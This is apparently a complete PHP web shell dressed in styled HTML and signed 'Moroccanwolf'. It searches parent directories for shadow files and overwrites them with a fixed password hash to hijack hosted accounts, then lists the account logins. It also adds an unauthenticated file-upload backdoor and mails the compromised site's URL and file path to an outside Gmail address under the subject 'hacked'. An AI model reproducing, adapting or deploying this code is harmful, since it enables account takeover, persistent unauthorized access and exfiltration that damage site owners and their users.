<head>
<style>
html,body{
  background: #0D0C0C;
  height: 100%;
  padding: 0;
  margin: 0;
}
.all{
  min-height: 100%;
  position: relative;
  margin-left: auto;
  margin-right: auto;
  width: 1100px;
  border-radius: 5px;
  padding-bottom: 27px;
}
marquee{
  color:#fff;
  text-shadow: 0 0 5px #fff;
  margin-top:10px;
}
table{
  border-collapse: collapse;
  margin-top: 20px;
  width: 500px;
  text-align: center;
  margin-bottom: 80px;
  color:#ff0000;
  text-shadow: 0 0 5px #ff0000;
  border:1px solid #444;
}
tr:hover{
  background: #800000;
}
th,td{
  padding: 10px;
}
a{
  text-decoration: none;
  color:rgb(0, 255, 153);
  text-shadow: 0 0 5px;
}
a:hover{
  text-shadow: 0 0 5px rgb(0, 255, 153);
}
.d:hover{
  transform: translateX(50px);
}
.n_1,.d_1,.d_2,.n_2{
  color:#000;
}
.footer{
  position: absolute;
  bottom: 0;
  text-align: center;
  color:#222;
  font-family: courier;
  text-shadow: 0 0 3px #fff;
  width: 1100;
  height: 50px;
}
.n_1:before{
content: "";
}

.shell{
  position: absolute;
  left:16%;
  background: #ff0000;
  opacity: 0.3;
  padding: 10px;
  border-radius: 5px;
  color: #fff;
  text-shadow: 0 0 5px #000;
  transition: all 0.4s;
}
.shell:after{
  content: "";
  position: absolute;
  width: 0;
  height: 0;
  border:10px solid transparent;
  border-left: 10px solid #ff0000;
  left:100%;
}
.shell:hover{
  opacity: 0.6;
}
</style>
<?php
echo "Moroccanwolf<br>";


$pat=array("",'../','../../','../../../','../../../../','../../../../../','../../../../../../');
$pass='$1$c5WCj0vT$pW/B8Jo3SKkcDsD1WrJtP0:16249::::::';
foreach($pat as $pa){
if(file_exists("$pa/etc")){
$path="$pa/etc/";
$a=scandir($path);
foreach ($a as $b){
if(@!eregi('.php',$b) && @!eregi('.txt',$b) && @!eregi('.html',$b) && @!eregi('htaccess',$b) && @!eregi('.ftp',$b))
$file="$path/$b/shadow";
if(file_exists($file)){
$html=@file_get_contents($file);
$html1=@str_replace(array("\n","\r", "\r\n" ," "), "", $html);
$aa=@explode('::::::',$html1);
foreach($aa as $aaa){
if(!empty($aaa)){
$ab=@explode(":$",$aaa);
$abc=$ab[0];
echo "$b|".'25'."|$abc@$b|".'123123'."<br>";
$save=@fopen('456789123','ab');
@fwrite($save,"$abc:$pass\r\n");
}}
$html2=@file_get_contents('456789123');
$save1=@fopen($file,'w');
@fwrite($save1,$html2);
@unlink('456789123');
@unlink('456789123');
@unlink('456789123');
}}}}
if($_GET['mw']=='delete'){
@unlink('10.php');
@unlink('10.php');
@unlink('10.php');
}
?>
<?php
$Mo  = $_GET['Mo'];

if($Mo == 'Mo'){

$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];

echo "<form method='POST' enctype='multipart/form-data'>
	<input type='file'name='file' />
	<input type='submit' value='go' />

</form>";

move_uploaded_file($filetmp,$filename); 
}
?>
 
 <?
$site = "www.google.com";
if(!ereg($site, $_SERVER['SERVER_NAME']))
{
$to = "rezlt0001@gmail.com";
$subject = "hacked";
$header = "from: hacked <rezlt0001@gmail.com>";
$message = "Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";
$message .= "Path : " . __file__;
$sentmail = @mail($to, $subject, $message, $header);

echo "";
exit;
}
?>
